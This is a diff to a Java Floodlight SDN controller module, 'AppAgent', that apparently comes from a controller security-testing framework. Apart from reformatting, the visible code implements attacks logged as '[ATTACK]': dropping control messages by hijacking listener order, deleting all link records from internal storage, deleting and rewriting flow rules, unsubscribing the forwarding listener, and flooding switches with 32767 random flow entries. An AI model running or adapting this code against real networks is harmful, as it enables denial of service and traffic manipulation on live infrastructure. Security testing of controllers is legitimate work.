@@ -11,30 +11,6 @@ import java.util.Random;
 import java.util.concurrent.Future;
 import java.util.concurrent.TimeUnit;
 
-import net.floodlightcontroller.core.FloodlightContext;
-import net.floodlightcontroller.core.IFloodlightProviderService;
-import net.floodlightcontroller.core.IOFMessageListener;
-import net.floodlightcontroller.core.IOFSwitch;
-import net.floodlightcontroller.core.IOFSwitch.PortChangeType;
-import net.floodlightcontroller.core.IOFSwitchListener;
-import net.floodlightcontroller.core.ImmutablePort;
-import net.floodlightcontroller.core.module.FloodlightModuleContext;
-import net.floodlightcontroller.core.module.FloodlightModuleException;
-import net.floodlightcontroller.core.module.IFloodlightModule;
-import net.floodlightcontroller.core.module.IFloodlightService;
-import net.floodlightcontroller.devicemanager.IDevice;
-import net.floodlightcontroller.devicemanager.IDeviceService;
-import net.floodlightcontroller.linkdiscovery.ILinkDiscoveryListener;
-import net.floodlightcontroller.linkdiscovery.ILinkDiscoveryService;
-import net.floodlightcontroller.packet.Ethernet;
-import net.floodlightcontroller.packet.IPacket;
-import net.floodlightcontroller.packet.IPv4;
-import net.floodlightcontroller.staticflowentry.IStaticFlowEntryPusherService;
-import net.floodlightcontroller.storage.IResultSet;
-import net.floodlightcontroller.storage.IStorageSourceService;
-import net.floodlightcontroller.storage.memory.MemoryStorageSource;
-import net.floodlightcontroller.topology.TopologyManager;
-
 import org.openflow.protocol.OFFlowMod;
 import org.openflow.protocol.OFMatch;
 import org.openflow.protocol.OFMessage;
@@ -54,8 +30,30 @@ import org.openflow.util.HexString;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-public class AppAgent implements IFloodlightModule, IOFMessageListener,
-		ILinkDiscoveryListener, IOFSwitchListener {
+import net.floodlightcontroller.core.FloodlightContext;
+import net.floodlightcontroller.core.IFloodlightProviderService;
+import net.floodlightcontroller.core.IOFMessageListener;
+import net.floodlightcontroller.core.IOFSwitch;
+import net.floodlightcontroller.core.IOFSwitch.PortChangeType;
+import net.floodlightcontroller.core.IOFSwitchListener;
+import net.floodlightcontroller.core.ImmutablePort;
+import net.floodlightcontroller.core.module.FloodlightModuleContext;
+import net.floodlightcontroller.core.module.FloodlightModuleException;
+import net.floodlightcontroller.core.module.IFloodlightModule;
+import net.floodlightcontroller.core.module.IFloodlightService;
+import net.floodlightcontroller.devicemanager.IDeviceService;
+import net.floodlightcontroller.linkdiscovery.ILinkDiscoveryListener;
+import net.floodlightcontroller.linkdiscovery.ILinkDiscoveryService;
+import net.floodlightcontroller.packet.Ethernet;
+import net.floodlightcontroller.packet.IPacket;
+import net.floodlightcontroller.packet.IPv4;
+import net.floodlightcontroller.staticflowentry.IStaticFlowEntryPusherService;
+import net.floodlightcontroller.storage.IResultSet;
+import net.floodlightcontroller.storage.IStorageSourceService;
+import net.floodlightcontroller.storage.memory.MemoryStorageSource;
+import net.floodlightcontroller.topology.TopologyManager;
+
+public class AppAgent implements IFloodlightModule, IOFMessageListener, ILinkDiscoveryListener, IOFSwitchListener {
 
 	class CPU extends Thread {
 		int result = 1;
@@ -79,9 +77,6 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 
 	private short FLOWMOD_DEFAULT_IDLE_TIMEOUT = (short) 0;
 	private short FLOWMOD_DEFAULT_HARD_TIMEOUT = (short) 0;
-
-	private static final String LINK_TABLE_NAME = "controller_link";
-	private static final String LINK_ID = "id";
 
 	protected IFloodlightProviderService floodlightProvider;
 	protected TopologyManager topoManager;
@@ -135,14 +130,12 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 	}
 
 	@Override
-	public void init(FloodlightModuleContext context)
-			throws FloodlightModuleException {
+	public void init(FloodlightModuleContext context) throws FloodlightModuleException {
 		// TODO Auto-generated method stub
 		storageSource = context.getServiceImpl(IStorageSourceService.class);
 		topoManager = context.getServiceImpl(TopologyManager.class);
 		mt = context.getServiceImpl(MemoryStorageSource.class);
-		floodlightProvider = context
-				.getServiceImpl(IFloodlightProviderService.class);
+		floodlightProvider = context.getServiceImpl(IFloodlightProviderService.class);
 		logger = LoggerFactory.getLogger(AppAgent.class);
 		dservice = context.getServiceImpl(IDeviceService.class);
 		fservice = context.getServiceImpl(IStaticFlowEntryPusherService.class);
@@ -154,8 +147,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 	}
 
 	@Override
-	public void startUp(FloodlightModuleContext context)
-			throws FloodlightModuleException {
+	public void startUp(FloodlightModuleContext context) throws FloodlightModuleException {
 		// TODO Auto-generated method stub
 		floodlightProvider.addOFMessageListener(OFType.BARRIER_REPLY, this);
 		floodlightProvider.addOFMessageListener(OFType.BARRIER_REQUEST, this);
@@ -167,18 +159,15 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 		floodlightProvider.addOFMessageListener(OFType.FLOW_MOD, this);
 		floodlightProvider.addOFMessageListener(OFType.FLOW_REMOVED, this);
 		floodlightProvider.addOFMessageListener(OFType.GET_CONFIG_REPLY, this);
-		floodlightProvider
-				.addOFMessageListener(OFType.GET_CONFIG_REQUEST, this);
+		floodlightProvider.addOFMessageListener(OFType.GET_CONFIG_REQUEST, this);
 		floodlightProvider.addOFMessageListener(OFType.HELLO, this);
 		floodlightProvider.addOFMessageListener(OFType.PACKET_IN, this);
 
 		floodlightProvider.addOFMessageListener(OFType.PACKET_OUT, this);
 		floodlightProvider.addOFMessageListener(OFType.PORT_MOD, this);
 		floodlightProvider.addOFMessageListener(OFType.PORT_STATUS, this);
-		floodlightProvider.addOFMessageListener(OFType.QUEUE_GET_CONFIG_REPLY,
-				this);
-		floodlightProvider.addOFMessageListener(
-				OFType.QUEUE_GET_CONFIG_REQUEST, this);
+		floodlightProvider.addOFMessageListener(OFType.QUEUE_GET_CONFIG_REPLY, this);
+		floodlightProvider.addOFMessageListener(OFType.QUEUE_GET_CONFIG_REQUEST, this);
 		floodlightProvider.addOFMessageListener(OFType.SET_CONFIG, this);
 		floodlightProvider.addOFMessageListener(OFType.STATS_REPLY, this);
 		floodlightProvider.addOFMessageListener(OFType.STATS_REQUEST, this);
@@ -189,8 +178,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 		System.out.println("[AppAgent] Control_Message_Drop");
 		isDrop = true;
 
-		List<IOFMessageListener> listeners = floodlightProvider.getListeners()
-				.get(OFType.PACKET_IN);
+		List<IOFMessageListener> listeners = floodlightProvider.getListeners().get(OFType.PACKET_IN);
 
 		IOFMessageListener temp = null;
 		for (IOFMessageListener listen : listeners) {
@@ -198,15 +186,13 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 				temp = listen;
 			}
 
-			floodlightProvider
-					.removeOFMessageListener(OFType.PACKET_IN, listen);
+			floodlightProvider.removeOFMessageListener(OFType.PACKET_IN, listen);
 		}
 
 		for (IOFMessageListener listen : listeners) {
 			floodlightProvider.addOFMessageListener(OFType.PACKET_IN, temp);
 			if (!listen.getName().equals("AppAgent")) {
-				floodlightProvider.addOFMessageListener(OFType.PACKET_IN,
-						listen);
+				floodlightProvider.addOFMessageListener(OFType.PACKET_IN, listen);
 			}
 		}
 
@@ -267,7 +253,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 		logger.info("[ATTACK] Internal Storage Manipulation");
 		String deletedInfo = "nothing";
 
-		IResultSet link = storageSource.executeQuery(LINK_TABLE_NAME, null,
+		IResultSet link = storageSource.executeQuery(InternalDBShow.LINK_TABLE_NAME, null,
 				null, null);
 		int count = 0;
 		List<String> linkIdList = new LinkedList<String>();
@@ -277,20 +263,20 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 		while (link.next()) {
 			try {
 				count++;
-				linkIdList.add(link.getString(LINK_ID));
-
+				linkIdList.add(link.getString(InternalDBShow.LINK_ID));
 			} catch (NullPointerException e) {
 				e.printStackTrace();
 			}
 		}
 
-		if (0 < count) {
+		for(int i =0; i<count; i++) {
+			deletedInfo = "success|";
 			logger.info("[ATTACK] Access InternalDB : delete Link Information");
-			logger.info("[ATTACK] delete Link Info: " + linkIdList.get(0));
-			storageSource.deleteRow(LINK_TABLE_NAME, linkIdList.get(0));
-			deletedInfo = linkIdList.get(0).toString();
+			logger.info("[ATTACK] delete Link Info: " + linkIdList.get(i));
+			storageSource.deleteRow(InternalDBShow.LINK_TABLE_NAME, linkIdList.get(i));
+			deletedInfo += linkIdList.get(i).toString();
 		}
-
+		
 		InternalDBShow.show(storageSource);
 		return deletedInfo;
 	}
@@ -308,8 +294,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 		}
 
 		for (IOFSwitch sw : switches) {
-			List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw,
-					(short) -1);
+			List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw, (short) -1);
 			System.out.println("Table size : " + flowTable.size());
 			for (OFFlowStatisticsReply flow : flowTable) {
 				System.out.println(flow);
@@ -320,27 +305,14 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 				OFMatch match = flow.getMatch().clone();
 				match.setWildcards(flow.getMatch().clone().getWildcards());
 
-				OFMessage fm = ((OFFlowMod) floodlightProvider
-						.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
-						.setMatch(match)
-						.setCookie(flow.getCookie())
-						.setCommand(OFFlowMod.OFPFC_DELETE)
+				OFMessage fm = ((OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
+						.setMatch(match).setCookie(flow.getCookie()).setCommand(OFFlowMod.OFPFC_DELETE)
 						.setActions(actions)
-						.setLengthU(
-								OFFlowMod.MINIMUM_LENGTH
-										+ (OFActionOutput.MINIMUM_LENGTH * actions
-												.size()));
+						.setLengthU(OFFlowMod.MINIMUM_LENGTH + (OFActionOutput.MINIMUM_LENGTH * actions.size()));
 
-				OFMessage fm2 = ((OFFlowMod) floodlightProvider
-						.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
-						.setMatch(match)
-						.setCookie(flow.getCookie())
-						.setCommand(OFFlowMod.OFPFC_ADD)
-						.setActions(actions)
-						.setLengthU(
-								OFFlowMod.MINIMUM_LENGTH
-										+ (OFActionOutput.MINIMUM_LENGTH * actions
-												.size()));
+				OFMessage fm2 = ((OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
+						.setMatch(match).setCookie(flow.getCookie()).setCommand(OFFlowMod.OFPFC_ADD).setActions(actions)
+						.setLengthU(OFFlowMod.MINIMUM_LENGTH + (OFActionOutput.MINIMUM_LENGTH * actions.size()));
 
 				try {
 					List<OFMessage> msglist = new ArrayList<OFMessage>(2);
@@ -351,8 +323,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 
 					result = "success|" + fm.toString() + "->" + fm2.toString();
 				} catch (Exception e) {
-					logger.error("Failed to clear flows on switch {} - {}",
-							this, e);
+					logger.error("Failed to clear flows on switch {} - {}", this, e);
 				}
 			}
 		}
@@ -377,28 +348,20 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 			for (IOFSwitch sw : switches) {
 				// sw.clearAllFlowMods();
 				// fservice.deleteAllFlows();
-				List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw,
-						(short) -1);
+				List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw, (short) -1);
 				for (OFFlowStatisticsReply flow : flowTable) {
 					System.out.println(flow);
 
 					List<OFAction> actions = new ArrayList<OFAction>();
-					actions.add(new OFActionOutput()
-							.setMaxLength((short) 0xffff));
+					actions.add(new OFActionOutput().setMaxLength((short) 0xffff));
 
 					OFMatch match = flow.getMatch().clone();
 					match.setWildcards(flow.getMatch().clone().getWildcards());
 
-					OFMessage fm = ((OFFlowMod) floodlightProvider
-							.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
-							.setMatch(match)
-							.setCookie(flow.getCookie())
-							.setCommand(OFFlowMod.OFPFC_DELETE)
+					OFMessage fm = ((OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
+							.setMatch(match).setCookie(flow.getCookie()).setCommand(OFFlowMod.OFPFC_DELETE)
 							.setActions(actions)
-							.setLengthU(
-									OFFlowMod.MINIMUM_LENGTH
-											+ (OFActionOutput.MINIMUM_LENGTH * actions
-													.size()));
+							.setLengthU(OFFlowMod.MINIMUM_LENGTH + (OFActionOutput.MINIMUM_LENGTH * actions.size()));
 
 					try {
 						List<OFMessage> msglist = new ArrayList<OFMessage>(1);
@@ -406,8 +369,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 						sw.write(msglist, null);
 						sw.flush();
 					} catch (Exception e) {
-						logger.error("Failed to clear flows on switch {} - {}",
-								this, e);
+						logger.error("Failed to clear flows on switch {} - {}", this, e);
 					}
 				}
 
@@ -419,8 +381,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 
 	// A-6-M
 	public String Event_Listener_Unsubscription() {
-		List<IOFMessageListener> listeners = floodlightProvider.getListeners()
-				.get(OFType.PACKET_IN);
+		List<IOFMessageListener> listeners = floodlightProvider.getListeners().get(OFType.PACKET_IN);
 
 		String removed = "";
 		for (IOFMessageListener listen : listeners) {
@@ -433,8 +394,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 				logger.info("\n\n[ATTACK] REMOVE: " + listen.getName());
 
 				removed = "forwarding";
-				floodlightProvider.removeOFMessageListener(OFType.PACKET_IN,
-						listen);
+				floodlightProvider.removeOFMessageListener(OFType.PACKET_IN, listen);
 			}
 		}
 		return removed;
@@ -505,29 +465,20 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 		match.setDataLayerDestination("ff:ff:ff:ff:ff:ff");
 
 		for (int i = 0; i < 32767; i++) {
-			OFFlowMod fm = (OFFlowMod) floodlightProvider.getOFMessageFactory()
-					.getMessage(OFType.FLOW_MOD);
+			OFFlowMod fm = (OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD);
 
 			// short inPort = 0;
 
 			List<OFAction> actions = new ArrayList<OFAction>();
 			actions.add(new OFActionOutput().setMaxLength((short) 0xffff));
 
-			fm.setIdleTimeout(FLOWMOD_DEFAULT_IDLE_TIMEOUT)
-					.setHardTimeout(FLOWMOD_DEFAULT_HARD_TIMEOUT)
-					.setBufferId(OFPacketOut.BUFFER_ID_NONE)
-					.setCookie(random.nextInt())
-					.setCommand(OFFlowMod.OFPFC_ADD)
-					.setActions(actions)
-					.setPriority((short) random.nextInt(32767))
-					.setLengthU(
-							OFFlowMod.MINIMUM_LENGTH
-									+ (OFActionOutput.MINIMUM_LENGTH * actions
-											.size()));
+			fm.setIdleTimeout(FLOWMOD_DEFAULT_IDLE_TIMEOUT).setHardTimeout(FLOWMOD_DEFAULT_HARD_TIMEOUT)
+					.setBufferId(OFPacketOut.BUFFER_ID_NONE).setCookie(random.nextInt()).setCommand(OFFlowMod.OFPFC_ADD)
+					.setActions(actions).setPriority((short) random.nextInt(32767))
+					.setLengthU(OFFlowMod.MINIMUM_LENGTH + (OFActionOutput.MINIMUM_LENGTH * actions.size()));
 
-			fm.setMatch(match.clone().setWildcards(
-					Wildcards.FULL.matchOn(Flag.IN_PORT).matchOn(Flag.DL_TYPE)
-							.matchOn(Flag.DL_SRC).matchOn(Flag.DL_DST)));
+			fm.setMatch(match.clone().setWildcards(Wildcards.FULL.matchOn(Flag.IN_PORT).matchOn(Flag.DL_TYPE)
+					.matchOn(Flag.DL_SRC).matchOn(Flag.DL_DST)));
 
 			// set input and output ports on the switch
 			// fm.getMatch().setInputPort(inPort);
@@ -558,8 +509,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 		}
 
 		for (IOFSwitch sw : switches) {
-			List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw,
-					(short) -1);
+			List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw, (short) -1);
 			// System.out.println("Table size : " + flowTable.size());
 			for (OFFlowStatisticsReply flow : flowTable) {
 				// System.out.println(flow);
@@ -570,10 +520,8 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 				int dst = 0;
 				int src = 0;
 
-				String srcS = HexString.toHexString(flow.getMatch()
-						.getDataLayerSource());
-				String dstS = HexString.toHexString(flow.getMatch()
-						.getDataLayerDestination());
+				String srcS = HexString.toHexString(flow.getMatch().getDataLayerSource());
+				String dstS = HexString.toHexString(flow.getMatch().getDataLayerDestination());
 				dst = map.get(dstS);
 				src = map.get(srcS);
 
@@ -628,26 +576,17 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 				newmatch.setDataLayerType((short) 0x800);
 				newmatch.setNetworkDestination(dst);
 				newmatch.setNetworkSource(src);
-				newmatch.setWildcards(Wildcards.FULL.matchOn(Flag.IN_PORT)
-						.matchOn(Flag.DL_TYPE).withNwSrcMask(32)
-						.withNwDstMask(32));
+				newmatch.setWildcards(
+						Wildcards.FULL.matchOn(Flag.IN_PORT).matchOn(Flag.DL_TYPE).withNwSrcMask(32).withNwDstMask(32));
 
-				OFMessage fm = ((OFFlowMod) floodlightProvider
-						.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
-						.setMatch(flow.getMatch().clone())
-						.setCookie(flow.getCookie())
+				OFMessage fm = ((OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
+						.setMatch(flow.getMatch().clone()).setCookie(flow.getCookie())
 						.setCommand(OFFlowMod.OFPFC_DELETE);
 
-				OFMessage fm2 = ((OFFlowMod) floodlightProvider
-						.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
-						.setMatch(newmatch)
-						.setCookie(flow.getCookie())
-						.setCommand(OFFlowMod.OFPFC_ADD)
-						.setActions(flow.getActions())
-						.setLengthU(
-								OFFlowMod.MINIMUM_LENGTH
-										+ (OFActionOutput.MINIMUM_LENGTH * flow
-												.getActions().size()));
+				OFMessage fm2 = ((OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
+						.setMatch(newmatch).setCookie(flow.getCookie()).setCommand(OFFlowMod.OFPFC_ADD)
+						.setActions(flow.getActions()).setLengthU(
+								OFFlowMod.MINIMUM_LENGTH + (OFActionOutput.MINIMUM_LENGTH * flow.getActions().size()));
 
 				try {
 					List<OFMessage> msglist = new ArrayList<OFMessage>(2);
@@ -656,12 +595,10 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 					sw.write(msglist, null);
 					sw.flush();
 
-					result = "success|" + fm.toString() + "\n->"
-							+ fm2.toString();
+					result = "success|" + fm.toString() + "\n->" + fm2.toString();
 					logger.info("[ATTACK] " + result);
 				} catch (Exception e) {
-					logger.error("Failed to clear flows on switch {} - {}",
-							this, e);
+					logger.error("Failed to clear flows on switch {} - {}", this, e);
 				}
 			}
 		}
@@ -670,8 +607,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 	}
 
 	// Get flow table in the switch
-	public List<OFFlowStatisticsReply> getSwitchFlowTable(IOFSwitch sw,
-			Short outPort) {
+	public List<OFFlowStatisticsReply> getSwitchFlowTable(IOFSwitch sw, Short outPort) {
 		List<OFFlowStatisticsReply> statsReply = new ArrayList<OFFlowStatisticsReply>();
 		List<OFStatistics> values = null;
 		Future<List<OFStatistics>> future;
@@ -701,13 +637,16 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 				}
 			}
 		} catch (Exception e) {
-			System.out.println("Failure retrieving statistics from switch "
-					+ sw);
+			System.out.println("Failure retrieving statistics from switch " + sw);
 		}
 
 		return statsReply;
 	}
 
+	public void testFunc() {
+		 
+	}
+	
 	@Override
 	public Command receive(IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
 		// TODO Auto-generated method stub
@@ -715,8 +654,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 		case PACKET_IN:
 			OFPacketIn pi = (OFPacketIn) msg;
 
-			Ethernet eth = IFloodlightProviderService.bcStore.get(cntx,
-					IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
+			Ethernet eth = IFloodlightProviderService.bcStore.get(cntx, IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
 
 			IPacket pkt = eth.getPayload();
 			IPv4 ip_pkt = null;
@@ -724,14 +662,11 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 			if (pkt instanceof IPv4) {
 				ip_pkt = (IPv4) pkt;
 
-				map.put(HexString.toHexString(eth.getDestinationMACAddress()),
-						ip_pkt.getDestinationAddress());
-
-				map.put(HexString.toHexString(eth.getSourceMACAddress()),
-						ip_pkt.getSourceAddress());
+				map.put(HexString.toHexString(eth.getDestinationMACAddress()), ip_pkt.getDestinationAddress());
+				map.put(HexString.toHexString(eth.getSourceMACAddress()), ip_pkt.getSourceAddress());
 
 			}
-
+			
 			if (isDrop) {
 				if (droppedPacket == null)
 					droppedPacket = pi;
@@ -740,50 +675,52 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 			} else if (isLoop) {
 				this.Infinite_Loop();
 			}
+			
+			testFunc();
 
 			return Command.CONTINUE;
-
-			// case STATS_REPLY:
-			// System.out.println("STATS_REPLY receive");
-			// break;
-			//
-			// case FEATURES_REPLY:
-			// // sniffingListener();
-			// System.out.println("FEATURES_REPLY receive");
-			// break;
-			//
-			// case GET_CONFIG_REPLY:
-			// // sniffingListener();
-			// System.out.println("GET_CONFIG_REPLY receive");
-			// break;
-			//
-			// case PORT_MOD:
-			// System.out.println("PORT_MOD receive");
-			// break;
-			//
-			// case PORT_STATUS:
-			// System.out.println("PORT_STATUS receive");
-			// break;
-			//
-			// case SET_CONFIG:
-			// System.out.println("SET_CONFIG receive");
-			// break;
-			//
-			// case FLOW_MOD:
-			// System.out.println(msg.toString());
-			// System.out.println("FLow_MOD receive");
-			// looping();
-			// // break;
-			//
-			// case PACKET_OUT:
-			// System.out.println("Packet-Out receive");
-			// System.out.println(msg.toString());
-			// break;
-			//
-			// default:
-			// System.out.println("others receive");
-			// System.out.println(msg.toString());
-			// break;
+			
+		// case STATS_REPLY:
+		// System.out.println("STATS_REPLY receive");
+		// break;
+		//
+		// case FEATURES_REPLY:
+		// // sniffingListener();
+		// System.out.println("FEATURES_REPLY receive");
+		// break;
+		//
+		// case GET_CONFIG_REPLY:
+		// // sniffingListener();
+		// System.out.println("GET_CONFIG_REPLY receive");
+		// break;
+		//
+		// case PORT_MOD:
+		// System.out.println("PORT_MOD receive");
+		// break;
+		//
+		// case PORT_STATUS:
+		// System.out.println("PORT_STATUS receive");
+		// break;
+		//
+		// case SET_CONFIG:
+		// System.out.println("SET_CONFIG receive");
+		// break;
+		//
+		// case FLOW_MOD:
+		// System.out.println(msg.toString());
+		// System.out.println("FLow_MOD receive");
+		// looping();
+		// // break;
+		//
+		// case PACKET_OUT:
+		// System.out.println("Packet-Out receive");
+		// System.out.println(msg.toString());
+		// break;
+		//
+		// default:
+		// System.out.println("others receive");
+		// System.out.println(msg.toString());
+		// break;
 		}
 
 		return Command.CONTINUE;
@@ -796,21 +733,14 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 	}
 
 	public void sniffingListener() {
-		List<IOFMessageListener> packetin_listeners = floodlightProvider
-				.getListeners().get(OFType.PACKET_IN);
-		List<IOFMessageListener> features_listeners = floodlightProvider
-				.getListeners().get(OFType.FEATURES_REPLY);
-		List<IOFMessageListener> status_listeners = floodlightProvider
-				.getListeners().get(OFType.STATS_REPLY);
-		List<IOFMessageListener> config_listeners = floodlightProvider
-				.getListeners().get(OFType.GET_CONFIG_REPLY);
-		List<IOFMessageListener> setconfig_listeners = floodlightProvider
-				.getListeners().get(OFType.PORT_STATUS);
-		List<IOFMessageListener> qyeue_listeners = floodlightProvider
-				.getListeners().get(OFType.QUEUE_GET_CONFIG_REPLY);
+		List<IOFMessageListener> packetin_listeners = floodlightProvider.getListeners().get(OFType.PACKET_IN);
+		List<IOFMessageListener> features_listeners = floodlightProvider.getListeners().get(OFType.FEATURES_REPLY);
+		List<IOFMessageListener> status_listeners = floodlightProvider.getListeners().get(OFType.STATS_REPLY);
+		List<IOFMessageListener> config_listeners = floodlightProvider.getListeners().get(OFType.GET_CONFIG_REPLY);
+		List<IOFMessageListener> setconfig_listeners = floodlightProvider.getListeners().get(OFType.PORT_STATUS);
+		List<IOFMessageListener> qyeue_listeners = floodlightProvider.getListeners().get(OFType.QUEUE_GET_CONFIG_REPLY);
 
-		logger.info("[ATTACK] Packet-In Listener : "
-				+ packetin_listeners.size());
+		logger.info("[ATTACK] Packet-In Listener : " + packetin_listeners.size());
 		IOFMessageListener temp = packetin_listeners.get(0);
 		packetin_listeners.set(packetin_listeners.size() - 1, temp);
 		packetin_listeners.set(0, this);
@@ -885,8 +815,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 	}
 
 	@Override
-	public void switchPortChanged(long switchId, ImmutablePort port,
-			PortChangeType type) {
+	public void switchPortChanged(long switchId, ImmutablePort port, PortChangeType type) {
 		// TODO Auto-generated method stub
 
 	}
